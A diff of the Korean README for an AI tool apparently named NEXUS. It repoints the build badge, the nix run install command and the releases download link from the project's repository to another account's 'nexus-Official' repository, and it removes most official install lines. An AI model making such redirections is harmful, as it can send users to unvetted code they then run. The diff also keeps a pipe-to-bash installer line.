@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # 패키지 매니저
 npm i -g nexus-ai@latest        # bun/pnpm/yarn 도 가능
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS 및 Linux (권장, 항상 최신)
-brew install nexus              # macOS 및 Linux (공식 brew formula, 업데이트 빈도 낮음)
-sudo pacman -S nexus            # Arch Linux (Stable)
 paru -S nexus-bin               # Arch Linux (Latest from AUR)
 mise use -g nexus               # 어떤 OS든
-nix run nixpkgs#nexus           # 또는 github:anomalyco/nexus 로 최신 dev 브랜치
+nix run github:ravipacharpro-jpg/nexus-Official           # 또는 github:ravipacharpro-jpg/nexus-Official 로 최신 dev 브랜치
 ```
 
 > [!TIP]
@@ -66,18 +61,16 @@ nix run nixpkgs#nexus           # 또는 github:anomalyco/nexus 로 최신 dev �
 
 ### 데스크톱 앱 (BETA)
 
-NEXUS 는 데스크톱 앱으로도 제공됩니다. [releases page](https://github.com/anomalyco/nexus/releases) 에서 직접 다운로드하거나 [nexus.ai/download](https://nexus.ai/download) 를 이용하세요.
+NEXUS 는 데스크톱 앱으로도 제공됩니다. [releases page](https://github.com/ravipacharpro-jpg/nexus-Official/releases) 에서 직접 다운로드하거나 [nexus.ai/download](https://nexus.ai/download) 를 이용하세요.
 
 | 플랫폼                | 다운로드                           |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb`, `.rpm`, 또는 AppImage      |
 
 ```bash
-# macOS (Homebrew)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
@@ -126,4 +119,3 @@ NEXUS 와 관련된 프로젝트를 진행하면서 이름에 "nexus"(예: "nexu
 
 ---
 
-**커뮤니티에 참여하기** [Discord](https://discord.gg/nexus) | [X.com](https://x.com/nexus)
